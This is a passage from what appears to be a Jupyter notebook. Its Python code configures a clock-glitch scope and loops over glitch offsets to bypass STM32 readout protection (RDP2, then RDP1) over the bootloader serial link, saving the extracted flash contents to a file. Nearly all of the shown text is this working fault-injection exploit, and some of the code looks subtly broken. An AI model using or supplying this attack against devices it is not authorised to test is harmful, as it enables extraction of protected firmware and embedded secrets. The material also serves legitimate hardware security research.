    "    scope.adc.samples = 131124\n",
    "    scope.clock.clkgen_freq = 30e6\n",
    "    scope.adc.offset = 0\n",
    "    scope.clock.adc_mul = 1\n",
    "    scope.trigger.module = 'edge_counter'\n",
    "    scope.trigger.triggers = \"tio4\"\n",
    "    scope.trigger.edges = 16\n",
    "    scope.io.glitch_trig_mcx = 'trigger'\n",
    "    scope.glitch.enabled = True\n",
    "    scope.glitch.clk_src = \"pll\" # set glitch input clock\n",
    "    scope.glitch.output = \"enable_only\" # glitch_out = clk ^ glitch\n",
    "    scope.glitch.trigger_src = \"ext_single\" # glitch only after scope.arm() called\n",
    "    scope.glitch.width = 40\n",
    "    scope.glitch.offset = -45\n",
    "    assert scope.glitch.mmcm_locked\n",
    "    \n",
    "successes = []\n",
    "\n",
    "def rdp2_bypass():\n",
    "    foo = False\n",
    "    swd_success = []\n",
    "    uart_success = []\n",
    "    boot_bypass = False\n",
    "    setup_SAD()\n",
    "    set_glitch_one_params()\n",
    "    while boot_bypass == False:\n",
    "        for glitch_setting in gc_rdp2.glitch_values():\n",
    "            scope.glitch.ext_offset = glitch_setting[0]\n",
    "            scope.glitch.repeat = 4\n",
    "            # Reboot target, arm scope, wait for glitch\n",
    "            reboot_flush()\n",
    "            # Allow target time to initialize\n",
    "            time.sleep(2)\n",
    "            # Reset glitch lines as reccomended in docs\n",
    "            scope.io.glitch_hp = False\n",
    "            scope.io.glitch_hp = True\n",
    "            scope.io.glitch_lp = False\n",
    "            scope.io.glitch_lp = True\n",
    "            # Check to see if glitch was successful\n",
    "            x = serial_check()\n",
    "            if x:\n",
    "                print(\"Serial bypass success! -- offset = {}, width = {}, ext_offset = {} repeat = {} foo = {}\".format(scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset,scope.glitch.repeat,foo))\n",
    "                uart_success.append(foo,scope.glitch.ext_offset)\n",
    "\n",
    "def rdp1_bypass():\n",
    "    rdp2_bypass()\n",
    "    print(\"First check bypassed!\")\n",
    "    fail_count = 0\n",
    "    for glitch_setting in gc_rdp1.glitch_values():\n",
    "        setup_edge_trigger()\n",
    "        scope.glitch.ext_offset = glitch_setting[0]\n",
    "        scope.glitch.repeat = 4\n",
    "        time.sleep(2)\n",
    "        scope.io.glitch_hp = False\n",
    "        scope.io.glitch_hp = True\n",
    "        scope.io.glitch_lp = False\n",
    "        scope.io.glitch_lp = True\n",
    "        x = serial_check()\n",
    "        if x == False:\n",
    "            soft_reboot(True)\n",
    "            fail_count += 1\n",
    "            if fail_count == 5:\n",
    "                # At this point assume we have crashed the STM32 and need to re-enter bootloader mode!\n",
    "                rdp2_bypass()\n",
    "                fail_count = 0\n",
    "        else:\n",
    "            x,flash_dat = serial_read()\n",
    "            if x:\n",
    "                print(\"Flash Read Success! -- offset = {}, width = {}, ext_offset = {}\".format(scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset))\n",
    "                flash_dat = bytes(flash_dat[1:])\n",
    "                with open(\"first_page_glitched.bin\",'wb') as ofile:\n",
    "                    ofile.write(flash_dat)\n",
    "                successes.append(scope.glitch.ext_offset)\n",
    "rdp1_bypass()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  },
  "toc-autonumbering": true
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
